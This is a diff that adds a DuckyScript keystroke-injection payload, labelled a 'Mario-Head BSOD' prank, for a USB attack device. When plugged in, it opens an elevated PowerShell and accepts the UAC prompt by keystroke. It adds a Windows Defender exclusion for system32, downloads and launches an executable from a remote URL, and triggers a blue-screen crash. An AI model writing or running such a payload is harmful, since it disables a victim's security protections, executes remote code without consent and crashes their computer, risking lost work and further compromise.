@@ -1,0 +1,28 @@
+REM Title: Mario-Head BSOD
+REM Author: Leo1338
+REM Target:  Win 10+, exe is Windows 7 and up 32/64 bit
+REM Version: 2.0
+REM Category: Prank
+REM Display a video of Mario's levitating head asking if he can have your computer and invokes a BSOD.
+REM
+REM startup delay
+SHIFT ALT
+DELAY 500
+SHIFT ALT
+DELAY 500
+SHIFT ALT
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+CTRL-SHIFT ENTER
+DELAY 1500
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 1500
+STRING Add-MpPreference -ExclusionPath C:\Windows\system32
+ENTER
+DELAY 500
+STRING $down=New-Object System.Net.WebClient;$url='https://github.com/bemxio/mario-head/releases/download/v2.1.0/mario_head.exe';$file='mario_dist.exe'; $down.DownloadFile($url,$file);Start-Process $file -WindowStyle Maximized; Start-Sleep -Seconds 3; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win32 { [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport("user32.dll")] public static extern bool keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo); }'; $process = Get-Process -Name "mario_dist" -ErrorAction SilentlyContinue; if ($process) { [Win32]::ShowWindow($process.MainWindowHandle, 3); Start-Sleep -Seconds 1; [Win32]::keybd_event(0x70, 0, 0, [UIntPtr]::Zero); Start-Sleep -Milliseconds 50; [Win32]::keybd_event(0x70, 0, 2, [UIntPtr]::Zero); }; exit
+ENTER
